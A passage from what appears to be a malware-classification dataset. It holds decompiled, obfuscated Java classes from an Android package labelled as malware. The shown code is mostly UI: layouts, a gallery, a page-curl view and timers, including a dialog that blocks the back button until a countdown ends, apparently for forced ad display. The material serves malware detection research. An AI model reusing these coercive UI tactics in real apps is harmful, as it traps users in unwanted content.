this.d.a(a4,a5);       }       new LinearLayout.LayoutParams(-1,-2).topMargin=com.apkmore.rbjatnldymzfiw.v.e.h.a(context,10);       this.c=new e(this.f172a);       LinearLayout.LayoutParams layoutParams6=new LinearLayout.LayoutParams(-1,-2);       layoutParams6.topMargin=com.apkmore.rbjatnldymzfiw.v.e.h.a(this.f172a,4);       linearLayout9.addView(this.c,layoutParams6);       this.c.a(this);       LinearLayout linearLayout10=new LinearLayout(context);       LinearLayout.LayoutParams layoutParams7=new LinearLayout.LayoutParams(-1,1);       layoutParams7.gravity=16;       layoutParams7.topMargin=com.apkmore.rbjatnldymzfiw.v.e.h.a(context,10);       linearLayout10.setBackgroundColor(-4604739);       linearLayout3.addView(linearLayout10,layoutParams7);       LinearLayout linearLayout11=new LinearLayout(context);       linearLayout11.setOrientation(1);       linearLayout3.addView(linearLayout11,new LinearLayout.LayoutParams(-1,-2));       FrameLayout frameLayout=new FrameLayout(context);       LinearLayout.LayoutParams layoutParams8=new LinearLayout.LayoutParams(-1,-2);       int a6=com.apkmore.rbjatnldymzfiw.v.e.h.a(context,2);       layoutParams8.bottomMargin=a6;       layoutParams8.topMargin=a6;       linearLayout11.addView(frameLayout,layoutParams8);       TextView textView2=new TextView(context);       textView2.setText(com.apkmore.rbjatnldymzfiw.v.e.b.aC + ""ï¼š"");       textView2.setTextColor(ViewCompat.MEASURED_STATE_MASK);       textView2.setTextSize(16.0f);       FrameLayout.LayoutParams layoutParams9=new FrameLayout.LayoutParams(-2,-2);       layoutParams9.gravity=19;       frameLayout.addView(textView2,layoutParams9);       ImageView imageView=new ImageView(context);       StateListDrawable stateListDrawable=new StateListDrawable();       stateListDrawable.addState(new int[]{R.attr.state_pressed},com.apkmore.rbjatnldymzfiw.v.e.a.c(context,7));       stateListDrawable.addState(new int[]{R.attr.state_enabled},com.apkmore.rbjatnldymzfiw.v.e.a.c(context,6));       imageView.setBackgroundDrawable(stateListDrawable);       FrameLayout.LayoutParams layoutParams10=new FrameLayout.LayoutParams(-2,-2);       layoutParams10.gravity=21;       layoutParams10.rightMargin=com.apkmore.rbjatnldymzfiw.v.e.h.a(context,8);       imageView.setTag(4);       imageView.setOnClickListener(this);       frameLayout.addView(imageView,layoutParams10);       LinearLayout linearLayout12=new LinearLayout(context);       LinearLayout.LayoutParams layoutParams11=new LinearLayout.LayoutParams(-1,1);       layoutParams11.gravity=16;       linearLayout12.setBackgroundColor(-4604739);       linearLayout11.addView(linearLayout12,layoutParams11);       FrameLayout frameLayout2=new FrameLayout(context);       linearLayout11.addView(frameLayout2,new LinearLayout.LayoutParams(-1,-2));       this.o=new r(context);       FrameLayout.LayoutParams layoutParams12=new FrameLayout.LayoutParams(-1,-1,1);       layoutParams12.gravity=16;       this.o.setNumColumns(2);       this.o.setVerticalSpacing(0);       this.o.setHorizontalSpacing(-1);       this.o.setOnItemClickListener(this);       this.o.setVisibility(8);       frameLayout2.addView(this.o,layoutParams12);       this.p=new FrameLayout(context);       frameLayout2.addView(this.p,new LinearLayout.LayoutParams(-1,-2));       ProgressBar progressBar=new ProgressBar(context);       FrameLayout.LayoutParams layoutParams13=new FrameLayout.LayoutParams(-2,-2);       layoutParams13.gravity=17;       this.p.addView(progressBar,layoutParams13);       this.p.setVisibility(0);       LinearLayout linearLayout13=new LinearLayout(context);       LinearLayout.LayoutParams layoutParams14=new LinearLayout.LayoutParams(-1,1);       layoutParams14.gravity=16;       linearLayout13.setBackgroundColor(-4604739);       this.b.addView(linearLayout13,layoutParams14);       FrameLayout frameLayout3=new FrameLayout(context);       LinearLayout.LayoutParams layoutParams15=new LinearLayout.LayoutParams(-1,-2);       layoutParams15.gravity=80;       this.b.addView(frameLayout3,layoutParams15);       LinearLayout linearLayout14=new LinearLayout(context);       linearLayout14.setOrientation(1);       LinearLayout linearLayout15=new LinearLayout(context);       linearLayout14.addView(linearLayout15);       FrameLayout.LayoutParams layoutParams16=new FrameLayout.LayoutParams(-1,-2);       layoutParams16.gravity=17;       frameLayout3.addView(linearLayout14,layoutParams16);       frameLayout3.setBackgroundDrawable(new GradientDrawable(GradientDrawable.Orientation.BOTTOM_TOP,new int[]{-4144960,-4144960,-4144960}));       LinearLayout.LayoutParams layoutParams17=new LinearLayout.LayoutParams(-2,-2);       layoutParams17.gravity=17;       layoutParams17.setMargins(com.apkmore.rbjatnldymzfiw.v.e.h.a(this.f172a,5),com.apkmore.rbjatnldymzfiw.v.e.h.a(this.f172a,5),com.apkmore.rbjatnldymzfiw.v.e.h.a(this.f172a,0),com.apkmore.rbjatnldymzfiw.v.e.h.a(this.f172a,5));       Button button=new Button(context);       StateListDrawable stateListDrawable2=new StateListDrawable();       stateListDrawable2.addState(new int[]{R.attr.state_pressed},com.apkmore.rbjatnldymzfiw.v.e.a.c(context,15));       stateListDrawable2.addState(new int[]{R.attr.state_enabled},com.apkmore.rbjatnldymzfiw.v.e.a.c(context,14));       button.setBackgroundDrawable(stateListDrawable2);       linearLayout15.addView(button,layoutParams17);       button.setTag(2);       button.setOnClickListener(this);       LinearLayout linearLayout16=new LinearLayout(context);       linearLayout16.setGravity(17);       StateListDrawable stateListDrawable3=new StateListDrawable();       NinePatchDrawable d=com.apkmore.rbjatnldymzfiw.v.e.a.d(context,3);       NinePatchDrawable d2=com.apkmore.rbjatnldymzfiw.v.e.a.d(context,2);       if (d != null) {         stateListDrawable3.addState(new int[]{R.attr.state_pressed},d);       }       if (d2 != null) {         stateListDrawable3.addState(new int[]{R.attr.state_enabled},d2);       }       linearLayout16.setBackgroundDrawable(stateListDrawable3);       linearLayout16.setTag(1);       linearLayout16.setOnClickListener(this);       LinearLayout.LayoutParams layoutParams18=new LinearLayout.LayoutParams(-2,-1);       layoutParams18.setMargins(com.apkmore.rbjatnldymzfiw.v.e.h.a(this.f172a,5),com.apkmore.rbjatnldymzfiw.v.e.h.a(this.f172a,5),com.apkmore.rbjatnldymzfiw.v.e.h.a(this.f172a,0),com.apkmore.rbjatnldymzfiw.v.e.h.a(this.f172a,5));       layoutParams18.weight=1.0f;       layoutParams18.gravity=17;       linearLayout15.addView(linearLayout16,layoutParams18);       this.r=new ImageView(context);       this.r.setBackgroundDrawable(com.apkmore.rbjatnldymzfiw.v.e.a.c(context,4));       LinearLayout.LayoutParams layoutParams19=new LinearLayout.LayoutParams(-2,-2);       layoutParams19.rightMargin=com.apkmore.rbjatnldymzfiw.v.e.h.a(this.f172a,5);       linearLayout16.addView(this.r,layoutParams19);       this.q=new TextView(context);       this.q.setText(com.apkmore.rbjatnldymzfiw.v.e.b.aD);       this.q.setTextColor(-1);       this.q.setTextSize(20.0f);       linearLayout16.addView(this.q,-2,-2);       LinearLayout.LayoutParams layoutParams20=new LinearLayout.LayoutParams(-2,-2);       layoutParams20.setMargins(com.apkmore.rbjatnldymzfiw.v.e.h.a(this.f172a,5),com.apkmore.rbjatnldymzfiw.v.e.h.a(this.f172a,5),com.apkmore.rbjatnldymzfiw.v.e.h.a(this.f172a,5),com.apkmore.rbjatnldymzfiw.v.e.h.a(this.f172a,5));       layoutParams20.gravity=17;       Button button2=new Button(context);       StateListDrawable stateListDrawable4=new StateListDrawable();       stateListDrawable4.addState(new int[]{R.attr.state_pressed},com.apkmore.rbjatnldymzfiw.v.e.a.c(context,9));       stateListDrawable4.addState(new int[]{R.attr.state_enabled},com.apkmore.rbjatnldymzfiw.v.e.a.c(context,8));       button2.setBackgroundDrawable(stateListDrawable4);       button2.setTag(3);       linearLayout15.addView(button2,layoutParams20);       button2.setOnClickListener(this);       this.l=new i(context,-1);       this.l.setSpacing(10);       this.l.setUnselectedAlpha(1.1f);       this.l.setBackgroundColor(-805306368);       this.l.setPadding(0,10,0,20);       this.l.a(a4,a5);       RelativeLayout.LayoutParams layoutParams21=new RelativeLayout.LayoutParams(-1,-1);       layoutParams21.addRule(10,0);       layoutParams21.addRule(12,0);       addView(this.l,layoutParams21);       this.l.setVisibility(8);       this.l.setFadingEdgeLength(0);       this.l.setOnItemClickListener(new b(this));       this.d.setOnItemClickListener(new c(this));     }  catch (    Exception e) {     }   }   private String a(  float f){     return f > 1024.0f ? (((int)((f / 1024.0f) * 100.0f)) / 100.0f) + ""M"" : ((int)Math.ceil(f)) + ""K"";   }   private WindowManager d(){     return (WindowManager)this.f172a.getSystemService(""window"");   }   public void a(  int i){     this.i.setText(com.apkmore.rbjatnldymzfiw.v.e.b.ay + ""ï¼š "" + a(i));   }   public void a(  Bitmap bitmap){     Drawable a2=com.apkmore.rbjatnldymzfiw.v.e.a.a(getContext(),bitmap);     if (a2 != null) {       this.k.setImageDrawable(a2);     }   }   public void a(  Bitmap bitmap,  int i){     d().getDefaultDisplay().getMetrics(new DisplayMetrics());     bitmap.setDensity((int)(r0.densityDpi / 0.8f));     if (i < 2) {       this.c.a(bitmap,i);     }     this.l.a(bitmap,i);   }   public void a(  View.OnClickListener onClickListener){     this.n=onClickListener;   }   public void a(  AdapterView.OnItemClickListener onItemClickListener){     this.v=onItemClickListener;   }   public void a(  String str){     this.f.setText(com.apkmore.rbjatnldymzfiw.v.e.b.av + ""ï¼š "" + str);   }   public void a(  List list){     Iterator it=list.iterator();     while (it.hasNext()) {       Bitmap bitmap=(Bitmap)it.next();       d().getDefaultDisplay().getMetrics(new DisplayMetrics());       bitmap.setDensity((int)(r2.densityDpi / 0.8f));     }     this.l.a(list);     if (list.size() > 2) {       this.c.a(list.subList(0,2));     }  else {       this.c.a(list);     }   }   public boolean a(){     if (this.l.getVisibility() != 0) {       return false;     }     this.l.setVisibility(8);     this.b.setVisibility(0);     return true;   }   public void b(){     this.o.setVisibility(0);     this.p.setVisibility(8);   }   public void b(  int i){     Bitmap a2=com.apkmore.rbjatnldymzfiw.v.e.a.a(getContext(),10);     DisplayMetrics displayMetrics=new DisplayMetrics();     d().getDefaultDisplay().getMetrics(displayMetrics);     int i2=displayMetrics.densityDpi;     if (a2 != null) {       a2.setDensity((int)(i2 / 0.8f));     }     ArrayList arrayList=new ArrayList(i);     for (int i3=0; i3 < i; i3++) {       if (a2 != null) {         arrayList.add(a2);       }     }     a(arrayList);   }   public void b(  String str){     this.e.setText(str);   }   public void b(  List list){     this.s=new com.apkmore.rbjatnldymzfiw.v.u(this.f172a,list);     this.o.setAdapter((ListAdapter)this.s);     this.s.notifyDataSetChanged();     this.o.setFocusable(false);     this.o.setVisibility(0);     this.p.setVisibility(8);   }   public void c(){     this.o.setVisibility(8);     this.p.setVisibility(0);   }   @Override public void c(  int i){     this.l.setVisibility(0);     this.l.setSelection(i);   }   public void c(  String str){     this.j.setText(str);   }   public void d(  String str){     this.g.setText(com.apkmore.rbjatnldymzfiw.v.e.b.aw + ""ï¼š "" + str);   }   public void e(  String str){     this.h.setText(com.apkmore.rbjatnldymzfiw.v.e.b.ax + ""ï¼š "" + str);   }   public void f(  String str){   }   public void g(  String str){   }   public void h(  String str){     this.q.setText(str);   }   @Override public void onClick(  View view){     if (this.n != null) {       this.n.onClick(view);     }   }   @Override public void onItemClick(  AdapterView adapterView,  View view,  int i,  long j){     if (this.v != null) {       this.v.onItemClick(adapterView,view,i,j);     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.d\b.code","public class b implements AdapterView.OnItemClickListener {   final a f173a;   public b(  a aVar){     this.f173a=aVar;   }   @Override public void onItemClick(  AdapterView adapterView,  View view,  int i,  long j){     i iVar;     i iVar2;     i iVar3;     iVar=this.f173a.l;     if (iVar.getVisibility() == 0) {       iVar2=this.f173a.l;       iVar2.setVisibility(8);       iVar3=this.f173a.d;       iVar3.setSelection(i);     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.d\c.code","public class c implements AdapterView.OnItemClickListener {   final a f174a;   public c(  a aVar){     this.f174a=aVar;   }   @Override public void onItemClick(  AdapterView adapterView,  View view,  int i,  long j){     i iVar;     i iVar2;     iVar=this.f174a.l;     iVar.setVisibility(0);     iVar2=this.f174a.l;     iVar2.setSelection(i);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.d\d.code","public class d implements View.OnClickListener {   final a f175a;   public d(  a aVar){     this.f175a=aVar;   }   @Override public void onClick(  View view){     boolean z;     TextView textView;     ImageView imageView;     TextView textView2;     ImageView imageView2;     try {       z=this.f175a.t;       if (z) {         textView2=this.f175a.j;         textView2.setMaxLines(this.f175a.f172a.getWallpaperDesiredMinimumHeight());         imageView2=this.f175a.m;         imageView2.setImageDrawable(com.apkmore.rbjatnldymzfiw.v.e.a.c(this.f175a.f172a,13));         this.f175a.t=false;       }  else {         textView=this.f175a.j;         textView.setMaxLines(5);         imageView=this.f175a.m;         imageView.setImageDrawable(com.apkmore.rbjatnldymzfiw.v.e.a.c(this.f175a.f172a,1));         this.f175a.t=true;       }     }  catch (    Exception e) {     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.d\e.code","public class e extends LinearLayout {   public static int f176a;   private ImageButton b;   private Context c;   private h d;   public e(  Context context){     super(context);     this.d=null;     this.c=context;     setBackgroundColor(-1250068);     setLayoutParams(new LinearLayout.LayoutParams(-1,-1));   }   public void a(  Bitmap bitmap,  int i){     if (bitmap == null) {       return;     }     ((ImageButton)getChildAt(i)).setBackgroundDrawable(com.apkmore.rbjatnldymzfiw.v.e.a.a(this.c,bitmap));   }   public void a(  h hVar){     this.d=hVar;   }   public void a(  List list){     int i=0;     while (true) {       int i2=i;       if (i2 >= list.size()) {         return;       }       this.b=new ImageButton(this.c);       Bitmap bitmap=(Bitmap)list.get(i2);       if (bitmap != null) {         this.b.setBackgroundDrawable(com.apkmore.rbjatnldymzfiw.v.e.a.a(this.c,bitmap));       }       this.b.setTag(Integer.valueOf(i2));       LinearLayout.LayoutParams layoutParams=new LinearLayout.LayoutParams(-2,((Bitmap)list.get(i2)).getHeight());       layoutParams.weight=1.0f;       int a2=com.apkmore.rbjatnldymzfiw.v.e.h.a(this.c,3);       layoutParams.bottomMargin=a2;       layoutParams.topMargin=a2;       layoutParams.leftMargin=a2;       layoutParams.rightMargin=a2;       addView(this.b,layoutParams);       this.b.setOnClickListener(new f(this));       if (list.size() > 0) {         this.b.post(new g(this,list,layoutParams));       }       i=i2 + 1;     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.d\f.code","public class f implements View.OnClickListener {   final e f177a;   public f(  e eVar){     this.f177a=eVar;   }   @Override public void onClick(  View view){     h hVar;     hVar=this.f177a.d;     hVar.c(((Integer)view.getTag()).intValue());   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.d\g.code","public class g implements Runnable {   final List f178a;   final LinearLayout.LayoutParams b;   final e c;   public g(  e eVar,  List list,  LinearLayout.LayoutParams layoutParams){     this.c=eVar;     this.f178a=list;     this.b=layoutParams;   }   @Override public void run(){     ImageButton imageButton;     ImageButton imageButton2;     imageButton=this.c.b;     int width=imageButton.getWidth();     int height=(((Bitmap)this.f178a.get(0)).getHeight() * width) / ((Bitmap)this.f178a.get(0)).getWidth();     if (e.f176a == 0) {       e.f176a=height;     }     if (e.f176a != 0) {       this.b.height=e.f176a;       imageButton2=this.c.b;       imageButton2.setLayoutParams(this.b);     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.d\h.code","public interface h {   void c(  int i); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.d\i.code","public class i extends Gallery {   private Bitmap f179a;   private Bitmap b;   private int c;   public i(  Context context){     super(context,null);     this.c=-2;     setAdapter((SpinnerAdapter)new j(this));   }   public i(  Context context,  int i){     super(context,null);     this.c=-2;     this.c=i;     setAdapter((SpinnerAdapter)new j(this));   }   private int a(){     return this.f179a.getHeight();   }   private void a(  Canvas canvas){     int count=getAdapter().getCount();     if (count <= 0 || this.f179a == null || this.b == null) {       return;     }     int width=this.f179a.getWidth();     int a2=a();     int selectedItemPosition=getSelectedItemPosition();     int width2=((getWidth() - (width * count)) - ((count - 1) * 10)) / 2;     int height=(getHeight() - a2) - 10;     for (int i=0; i < count; i++) {       if (i != selectedItemPosition) {         canvas.drawBitmap(this.f179a,width2,height,(Paint)null);       }  else {         canvas.drawBitmap(this.b,width2,height,(Paint)null);       }       width2+=width + 10;     }   }   private boolean a(  MotionEvent motionEvent,  MotionEvent motionEvent2){     return motionEvent2.getX() > motionEvent.getX();   }   public void a(  Bitmap bitmap,  int i){     j jVar=(j)getAdapter();     jVar.a().set(i,bitmap);     jVar.notifyDataSetChanged();   }   public void a(  Bitmap bitmap,  Bitmap bitmap2){     this.f179a=bitmap;     this.b=bitmap2;     this.f179a.setDensity(240);     this.b.setDensity(240);   }   public void a(  List list){     ((j)getAdapter()).a(list);   }   @Override public void draw(  Canvas canvas){     super.draw(canvas);     a(canvas);   }   @Override public boolean onFling(  MotionEvent motionEvent,  MotionEvent motionEvent2,  float f,  float f2){     onKeyDown(a(motionEvent,motionEvent2) ? 21 : 22,null);     return true;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.d\j.code","public class j extends BaseAdapter {   List f180a=new ArrayList();   final i b;   public j(  i iVar){     this.b=iVar;   }   public List a(){     return this.f180a;   }   public void a(  List list){     this.f180a=list;     notifyDataSetChanged();   }   @Override public int getCount(){     return this.f180a.size();   }   @Override public Object getItem(  int i){     return this.f180a.get(i);   }   @Override public long getItemId(  int i){     return i;   }   @Override public View getView(  int i,  View view,  ViewGroup viewGroup){     View view2;     int i2;     int i3;     if (view == null) {       ImageView imageView=new ImageView(this.b.getContext());       imageView.setAdjustViewBounds(true);       imageView.setScaleType(ImageView.ScaleType.FIT_CENTER);       i2=this.b.c;       i3=this.b.c;       imageView.setLayoutParams(new Gallery.LayoutParams(i2,i3));       view2=imageView;     }  else {       view2=view;     }     Bitmap bitmap=(Bitmap)this.f180a.get(i);     if (bitmap != null) {       ((ImageView)view2).setImageDrawable(com.apkmore.rbjatnldymzfiw.v.e.a.a(this.b.getContext(),bitmap));     }     return view2;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.d\k.code","public class k extends RelativeLayout {   private com.apkmore.rbjatnldymzfiw.v.j d;   private FrameLayout e;   private FrameLayout f;   private ImageView g;   private FrameLayout.LayoutParams h;   private int i;   private Context k;   private s l;   public static k f181a=null;   public static k b=null;   private static com.apkmore.rbjatnldymzfiw.v.b.f j=null;   public static n c=null;   public k(  Context context,  com.apkmore.rbjatnldymzfiw.v.b.f fVar,  int i){     super(context);     this.k=context;     com.apkmore.rbjatnldymzfiw.v.e.h.a(this.k,1);     int a2=com.apkmore.rbjatnldymzfiw.v.e.h.f(context) == 160 ? 23 : com.apkmore.rbjatnldymzfiw.v.e.h.a(this.k,3);     j=fVar;     this.i=i;     this.d=new com.apkmore.rbjatnldymzfiw.v.j(context);     this.e=new FrameLayout(context);     this.f=new FrameLayout(context);     this.f.setLayoutParams(new FrameLayout.LayoutParams(-2,-2));     this.g=new ImageView(context);     this.h=new FrameLayout.LayoutParams(-2,-2);     this.h.gravity=53;     try {       this.g.setBackgroundDrawable(com.apkmore.rbjatnldymzfiw.v.e.a.c(this.k,16));     }  catch (    Exception e) {     }     this.l=new s(context,fVar);     this.f.addView(this.l,new FrameLayout.LayoutParams(-2,-2));     this.f.setPadding(0,a2,a2,0);     addView(this.e);     this.e.addView(this.f);     this.e.addView(this.g,this.h);     this.g.setVisibility(8);     this.g.setOnClickListener(new l(this,context,i));   }   public static k a(  Context context,  com.apkmore.rbjatnldymzfiw.v.b.f fVar,  int i){     j=fVar;     if (b == null) {       b=new k(context,fVar,i);     }     return b;   }   public void a(){     this.g.setVisibility(8);     new m(this,j.q * 1000,1000L).start();   }   public void a(  int i){     if (this.l != null) {       this.f.removeView(this.l);       this.l=new s(this.k,j); switch (i) { case 1:         FrameLayout.LayoutParams layoutParams=new FrameLayout.LayoutParams(-2,-2);       layoutParams.rightMargin=com.apkmore.rbjatnldymzfiw.v.e.h.a(this.k,23);     layoutParams.topMargin=com.apkmore.rbjatnldymzfiw.v.e.h.a(this.k,20);   this.f.addView(this.l,layoutParams); break; } this.g.bringToFront(); } } public void a(n nVar){ c=nVar; } @Override public boolean onTouchEvent(MotionEvent motionEvent){ if (c != null) { return c.a(motionEvent,this.i); } return true; } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.d\l.code","class l implements View.OnClickListener {   final Context f182a;   final int b;   final k c;   public l(  k kVar,  Context context,  int i){     this.c=kVar;     this.f182a=context;     this.b=i;   }   @Override public void onClick(  View view){     com.apkmore.rbjatnldymzfiw.v.j.a(this.f182a).a(this.b);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.d\m.code","public class m extends CountDownTimer {   final k f183a;   public m(  k kVar,  long j,  long j2){     super(j,j2);     this.f183a=kVar;   }   @Override public void onFinish(){     ImageView imageView;     imageView=this.f183a.g;     imageView.setVisibility(0);   }   @Override public void onTick(  long j){   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.d\n.code","public interface n {   boolean a(  MotionEvent motionEvent,  int i); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.d\o.code","public class o extends Dialog {   private boolean f184a;   private com.apkmore.rbjatnldymzfiw.v.b.f b;   private q c;   public o(  Context context,  boolean z,  DialogInterface.OnCancelListener onCancelListener,  com.apkmore.rbjatnldymzfiw.v.b.f fVar){     super(context,z,onCancelListener);     this.f184a=false;     this.b=fVar;     new p(this,this.b.q * 1000,1000L).start();   }   public void a(  q qVar){     this.c=qVar;   }   @Override public void onBackPressed(){     if (this.f184a) {       super.onBackPressed();       this.c.a();     }   }   @Override public void onWindowFocusChanged(  boolean z){     super.onWindowFocusChanged(z);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.d\p.code","public class p extends CountDownTimer {   final o f185a;   public p(  o oVar,  long j,  long j2){     super(j,j2);     this.f185a=oVar;   }   @Override public void onFinish(){     this.f185a.f184a=true;   }   @Override public void onTick(  long j){   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.d\q.code","public interface q {   void a(); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.d\r.code","public class r extends GridView {   public r(  Context context){     super(context);   }   @Override public void onMeasure(  int i,  int i2){     super.onMeasure(i,View.MeasureSpec.makeMeasureSpec(536870911,ExploreByTouchHelper.INVALID_ID));   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.d\s.code","public class s extends View {   GradientDrawable A;   GradientDrawable B;   GradientDrawable C;   GradientDrawable D;   Paint E;   Paint F;   Rect G;   private int H;   private int I;   private Path J;   private Path K;   private int L;   private int M;   private Bitmap N;   private Canvas O;   private Paint P;   private t Q;   private int R;   private int S;   private int T;   private int U;   private Context V;   Bitmap f186a;   Bitmap b;   PointF c;   PointF d;   PointF e;   PointF f;   PointF g;   PointF h;   PointF i;   PointF j;   PointF k;   float l;   float m;   float n;   float o;   ColorMatrixColorFilter p;   Matrix q;   float[] r;   boolean s;   float t;   int[] u;   int[] v;   GradientDrawable w;   GradientDrawable x;   GradientDrawable y;   GradientDrawable z;   public s(  Context context,  com.apkmore.rbjatnldymzfiw.v.b.f fVar){     super(context);     this.H=0;     this.I=0;     this.f186a=null;     this.b=null;     this.c=new PointF();     this.d=new PointF();     this.e=new PointF();     this.L=0;     this.M=0;     this.f=new PointF();     this.g=new PointF();     this.h=new PointF();     this.i=new PointF();     this.j=new PointF();     this.k=new PointF();     this.r=new float[]{0.0f,0.0f,0.0f,0.0f,0.0f,0.0f,0.0f,0.0f,1.0f};     this.t=(float)Math.hypot(this.H,this.I);     this.Q=null;     this.R=0;     this.G=null;     this.U=20;     this.V=context;     this.f186a=u.a(context,com.apkmore.rbjatnldymzfiw.v.e.h.a(context,com.apkmore.rbjatnldymzfiw.v.e.b.F,fVar.e).getAbsolutePath());     this.b=u.b(context,com.apkmore.rbjatnldymzfiw.v.e.h.a(context,com.apkmore.rbjatnldymzfiw.v.e.b.G,fVar.e).getAbsolutePath());     this.S=this.f186a.getWidth();     this.T=this.f186a.getHeight();     this.H=context.getResources().getDisplayMetrics().widthPixels;     this.I=context.getResources().getDisplayMetrics().heightPixels;     if (this.S <= this.H && this.T <= this.I) {       this.G=new Rect(0,0,this.S,this.T);       this.L=this.S;       this.M=0;       this.d.x=this.S;       this.d.y=0.0f;     }  else     if (this.S > this.H || this.T > this.I) {       this.S=this.H;       this.T=this.I;       this.G=new Rect(0,0,this.H,this.I);       this.L=this.S;       this.M=0;       this.d.x=this.S;       this.d.y=0.0f;     }     this.Q=new t(this);     this.J=new Path();     this.K=new Path();     d();     this.N=Bitmap.createBitmap(this.S,this.T,Bitmap.Config.ARGB_8888);     this.O=new Canvas(this.N);     this.P=new Paint(4);     this.E=new Paint();     this.F=new Paint();     this.F.setStyle(Paint.Style.FILL);     ColorMatrix colorMatrix=new ColorMatrix();     colorMatrix.set(new float[]{0.55f,0.0f,0.0f,0.0f,80.0f,0.0f,0.55f,0.0f,0.0f,80.0f,0.0f,0.0f,0.55f,0.0f,80.0f,0.0f,0.0f,0.0f,0.2f,0.0f});     this.p=new ColorMatrixColorFilter(colorMatrix);     this.q=new Matrix();     this.Q.a(true);     this.Q.start();   }   private void a(  float f,  float f2){     if ((this.L == 0 && this.M == this.I) || (this.L == this.H && this.M == 0)) {       this.s=true;     }  else {       this.s=false;     }   }   private void a(  Canvas canvas,  Bitmap bitmap){     int i;     int i2;     GradientDrawable gradientDrawable;     this.K.reset();     this.K.moveTo(this.c.x,this.c.y);     this.K.lineTo(this.i.x,this.i.y);     this.K.lineTo(this.k.x,this.k.y);     this.K.lineTo(this.j.x,this.j.y);     this.K.lineTo(this.L,this.M);     this.K.close();     this.n=(float)Math.toDegrees(Math.atan2(this.f.x - this.L,this.h.y - this.M));     if (this.s) {       i=(int)this.c.x;       i2=(int)(this.c.x + (this.o / 4.0f));       gradientDrawable=this.w;     }  else {       i=(int)(this.c.x - (this.o / 4.0f));       i2=(int)this.c.x;       gradientDrawable=this.x;     }     canvas.save();     canvas.drawBitmap(bitmap,(Rect)null,this.G,(Paint)null);     canvas.rotate(this.n,this.c.x,this.c.y);     gradientDrawable.setBounds(i,(int)this.c.y,i2,(int)(this.t + this.c.y));     gradientDrawable.draw(canvas);     canvas.restore();   }   private void a(  Canvas canvas,  Bitmap bitmap,  Path path){     this.J.reset();     this.J.moveTo(this.c.x,this.c.y);     this.J.quadTo(this.f.x,this.f.y,this.g.x,this.g.y);     this.J.lineTo(this.d.x,this.d.y);     this.J.lineTo(this.e.x,this.e.y);     this.J.quadTo(this.h.x,this.h.y,this.j.x,this.j.y);     this.J.lineTo(this.L,this.M);     this.J.close();     canvas.save();     canvas.drawBitmap(bitmap,(Rect)null,this.G,(Paint)null);     canvas.restore();   }   private void c(){     this.l=(this.d.x + this.L) / 2.0f;     this.m=(this.d.y + this.M) / 2.0f;     this.f.x=this.l - (((this.M - this.m) * (this.M - this.m)) / (this.L - this.l));     this.f.y=this.M;     this.h.x=this.L;     this.h.y=this.m - (((this.L - this.l) * (this.L - this.l)) / (this.M - this.m));     this.c.x=this.f.x - ((this.L - this.f.x) / 2.0f);     this.c.y=this.M;     this.j.x=this.L;     this.j.y=this.h.y - ((this.M - this.h.y) / 2.0f);     this.o=(float)Math.hypot(this.d.x - this.L,this.d.y - this.M);     this.g=a(this.d,this.f,this.c,this.j);     this.e=a(this.d,this.h,this.c,this.j);     this.i.x=((this.c.x + (this.f.x * 2.0f)) + this.g.x) / 4.0f;     this.i.y=(((this.f.y * 2.0f) + this.c.y) + this.g.y) / 4.0f;     this.k.x=((this.j.x + (this.h.x * 2.0f)) + this.e.x) / 4.0f;     this.k.y=(((this.h.y * 2.0f) + this.j.y) + this.e.y) / 4.0f;   }   private void d(){     int[] 